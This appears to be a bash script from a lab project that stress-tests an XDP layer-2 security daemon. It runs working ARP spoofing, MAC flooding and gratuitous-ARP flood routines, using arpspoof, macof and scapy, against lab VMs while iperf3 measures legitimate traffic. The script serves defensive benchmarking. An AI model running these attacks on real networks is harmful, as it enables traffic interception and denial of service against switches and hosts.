#!/bin/bash
# ═══════════════════════════════════════════════════════════════════════
# benchmark_attack.sh — XDP Performance Under Attack
#
# Runs legitimate traffic (iperf3) and attack traffic simultaneously
# to measure XDP's ability to handle both at scale.
#
# Run this on VM-A (Attacker). It generates attack traffic while
# VM-C runs iperf3 against VM-D in parallel.
#
# Usage:
#   On VM-D:  iperf3 -s
#   On VM-C:  iperf3 -c 192.168.100.1 -t 60 -f m
#   On VM-A:  sudo ./benchmark_attack.sh <attack_type> <interface> <duration>
#
# Attack types: arp_spoof, mac_flood, garp, all
#
# Example:
#   sudo ./benchmark_attack.sh mac_flood eth0 30
#   sudo ./benchmark_attack.sh arp_spoof eth0 30
#   sudo ./benchmark_attack.sh all eth0 60
# ═══════════════════════════════════════════════════════════════════════

set -euo pipefail

ATTACK="${1:?Usage: $0 <arp_spoof|mac_flood|garp|all> <interface> <duration_secs>}"
IFACE="${2:-eth0}"
DURATION="${3:-30}"

TARGET_IP="192.168.100.100"     # VM-C (victim)
GATEWAY_IP="192.168.100.1"      # VM-D (DHCP server)

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
NC='\033[0m'

info() { echo -e "${CYAN}[BENCH]${NC} $*"; }
warn() { echo -e "${YELLOW}[WARN]${NC} $*"; }

RESULTS_FILE="attack_benchmark_${ATTACK}_$(date +%Y%m%d_%H%M%S).txt"

echo ""
echo -e "${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}║         XDP Attack Performance Benchmark                   ║${NC}"
echo -e "${BOLD}╠══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BOLD}║  Attack: ${ATTACK}${NC}"
echo -e "${BOLD}║  Interface: ${IFACE}${NC}"
echo -e "${BOLD}║  Duration: ${DURATION}s${NC}"
echo -e "${BOLD}║  Target: ${TARGET_IP} | Gateway: ${GATEWAY_IP}${NC}"
echo -e "${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

{
    echo "═══════════════════════════════════════════════════════"
    echo "  Attack Benchmark: ${ATTACK}"
    echo "  Date: $(date)"
    echo "  Duration: ${DURATION}s"
    echo "═══════════════════════════════════════════════════════"
    echo ""
} > "$RESULTS_FILE"

# ── Check dependencies ──────────────────────────────────────────────
check_deps() {
    for cmd in "$@"; do
        if ! command -v "$cmd" &>/dev/null; then
            warn "$cmd not found, installing..."
            case "$cmd" in
                macof|arpspoof) sudo apt install -y dsniff ;;
                hping3) sudo apt install -y hping3 ;;
                scapy|python3) sudo apt install -y python3-scapy ;;
            esac
        fi
    done
}

# ════════════════════════════════════════════════════════════════════
# ARP Spoofing at Scale
# ════════════════════════════════════════════════════════════════════
run_arp_spoof() {
    info "Starting high-rate ARP spoof attack for ${DURATION}s..."

    check_deps arpspoof

    echo "── ARP Spoof Flood ──" >> "$RESULTS_FILE"

    # Disable IP forwarding so we measure pure drop rate
    echo 0 > /proc/sys/net/ipv4/ip_forward

    START_TIME=$(date +%s%N)

    # Run arpspoof in background
    timeout "$DURATION" arpspoof -i "$IFACE" -t "$TARGET_IP" "$GATEWAY_IP" &>/dev/null &
    SPOOF_PID1=$!

    # Also spoof in reverse direction for maximum attack volume
    timeout "$DURATION" arpspoof -i "$IFACE" -t "$GATEWAY_IP" "$TARGET_IP" &>/dev/null &
    SPOOF_PID2=$!

    # Additionally, use scapy for high-rate ARP flooding
    python3 -c "
from scapy.all import *
import time, sys

iface = '$IFACE'
target_ip = '$TARGET_IP'
gateway_ip = '$GATEWAY_IP'
duration = int('$DURATION')
attacker_mac = get_if_hwaddr(iface)

# Create ARP reply packets
pkt1 = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(
    op=2, psrc=gateway_ip, pdst=target_ip,
    hwsrc=attacker_mac, hwdst='ff:ff:ff:ff:ff:ff'
)
pkt2 = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(
    op=2, psrc=target_ip, pdst=gateway_ip,
    hwsrc=attacker_mac, hwdst='ff:ff:ff:ff:ff:ff'
)

count = 0
end_time = time.time() + duration
while time.time() < end_time:
    sendp([pkt1, pkt2], iface=iface, verbose=False, count=100)
    count += 200

elapsed = duration
pps = count / elapsed if elapsed > 0 else 0
print(f'Sent {count} spoofed ARP packets in {elapsed}s ({pps:.0f} pps)')
" 2>&1 | tee -a "$RESULTS_FILE"

    # Cleanup
    kill $SPOOF_PID1 $SPOOF_PID2 2>/dev/null || true
    wait $SPOOF_PID1 2>/dev/null || true
    wait $SPOOF_PID2 2>/dev/null || true

    END_TIME=$(date +%s%N)
    ELAPSED=$(( (END_TIME - START_TIME) / 1000000 ))

    echo "Total attack duration: ${ELAPSED}ms" >> "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"
}

# ════════════════════════════════════════════════════════════════════
# MAC Flooding at Scale
# ════════════════════════════════════════════════════════════════════
run_mac_flood() {
    info "Starting high-rate MAC flood attack for ${DURATION}s..."

    check_deps macof

    echo "── MAC Flood (macof) ──" >> "$RESULTS_FILE"

    START_TIME=$(date +%s%N)

    # Run macof and count output lines (each line = 1 packet)
    PACKET_COUNT=$(timeout "$DURATION" macof -i "$IFACE" 2>/dev/null | wc -l || true)
    # Ensure PACKET_COUNT is a number
    PACKET_COUNT=${PACKET_COUNT:-0}

    END_TIME=$(date +%s%N)
    ELAPSED_MS=$(( (END_TIME - START_TIME) / 1000000 ))
    ELAPSED_S=$(echo "scale=2; $ELAPSED_MS / 1000" | bc)

    if [[ "$ELAPSED_MS" -gt 0 ]]; then
        PPS=$(echo "scale=0; $PACKET_COUNT * 1000 / $ELAPSED_MS" | bc)
    else
        PPS=0
    fi

    echo "macof sent: $PACKET_COUNT packets in ${ELAPSED_S}s ($PPS pps)" | tee -a "$RESULTS_FILE"
    echo "" >> "$RESULTS_FILE"

    # Also run a second method using scapy for even higher rates
    info "Running scapy-based MAC flood for additional volume..."
    echo "── MAC Flood (scapy high-rate) ──" >> "$RESULTS_FILE"

    python3 -c "
from scapy.all import *
import time, random, struct

iface = '$IFACE'
duration = min(int('$DURATION'), 30)  # Cap at 30s for scapy

count = 0
end_time = time.time() + duration
batch = []

# Pre-generate a batch of random MAC packets
for _ in range(100):
    src_mac = RandMAC()
    dst_mac = RandMAC()
    pkt = Ether(src=src_mac, dst=dst_mac)/IP(
        src=RandIP(), dst=RandIP()
    )/TCP(sport=RandShort(), dport=RandShort())
    batch.append(pkt)

while time.time() < end_time:
    sendp(batch, iface=iface, verbose=False)
    count += len(batch)

elapsed = duration
pps = count / elapsed if elapsed > 0 else 0
print(f'Sent {count} random-MAC packets in {elapsed}s ({pps:.0f} pps)')
" 2>&1 | tee -a "$RESULTS_FILE"

    echo "" >> "$RESULTS_FILE"
}

# ════════════════════════════════════════════════════════════════════
# Gratuitous ARP at Scale
# ════════════════════════════════════════════════════════════════════
run_garp() {
    info "Starting high-rate Gratuitous ARP attack for ${DURATION}s..."

    echo "── Gratuitous ARP Flood ──" >> "$RESULTS_FILE"

    python3 -c "
from scapy.all import *
import time

iface = '$IFACE'
target_ip = '$TARGET_IP'
gateway_ip = '$GATEWAY_IP'
duration = int('$DURATION')
attacker_mac = get_if_hwaddr(iface)

# Gratuitous ARP: sender_ip == target_ip
garp1 = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(
    op=2, psrc=target_ip, pdst=target_ip,
    hwsrc=attacker_mac, hwdst='ff:ff:ff:ff:ff:ff'
)
garp2 = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(
    op=2, psrc=gateway_ip, pdst=gateway_ip,
    hwsrc=attacker_mac, hwdst='ff:ff:ff:ff:ff:ff'
)
garp3 = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(
    op=1, psrc=target_ip, pdst=target_ip,
    hwsrc=attacker_mac, hwdst='00:00:00:00:00:00'
)

batch = [garp1, garp2, garp3]

count = 0
end_time = time.time() + duration
while time.time() < end_time:
    sendp(batch, iface=iface, verbose=False, count=50)
    count += 150

elapsed = duration
pps = count / elapsed if elapsed > 0 else 0
print(f'Sent {count} gratuitous ARP packets in {elapsed}s ({pps:.0f} pps)')
" 2>&1 | tee -a "$RESULTS_FILE"

    echo "" >> "$RESULTS_FILE"
}

# ════════════════════════════════════════════════════════════════════
# Run selected attack
# ════════════════════════════════════════════════════════════════════
case "$ATTACK" in
    arp_spoof)
        run_arp_spoof
        ;;
    mac_flood)
        run_mac_flood
        ;;
    garp)
        run_garp
        ;;
    all)
        DURATION_EACH=$(( DURATION / 3 ))
        info "Running all attacks (${DURATION_EACH}s each)..."
        DURATION="$DURATION_EACH"
        run_arp_spoof
        sleep 2
        run_mac_flood
        sleep 2
        run_garp
        ;;
    *)
        echo "Unknown attack type: $ATTACK"
        echo "Valid types: arp_spoof, mac_flood, garp, all"
        exit 1
        ;;
esac

echo ""
echo -e "${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}║         Attack Benchmark Complete                          ║${NC}"
echo -e "${BOLD}╠══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BOLD}║  Results: $RESULTS_FILE${NC}"
echo -e "${BOLD}║                                                            ║${NC}"
echo -e "${BOLD}║  NOW CHECK VM-B:                                           ║${NC}"
echo -e "${BOLD}║    sudo ./build/l2_security_daemon --stats                 ║${NC}"
echo -e "${BOLD}║    or check the running daemon's Ctrl+C output             ║${NC}"
echo -e "${BOLD}║                                                            ║${NC}"
echo -e "${BOLD}║  KEY METRIC: Compare drop counter with packets sent        ║${NC}"
echo -e "${BOLD}║  to calculate detection rate at high throughput             ║${NC}"
echo -e "${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
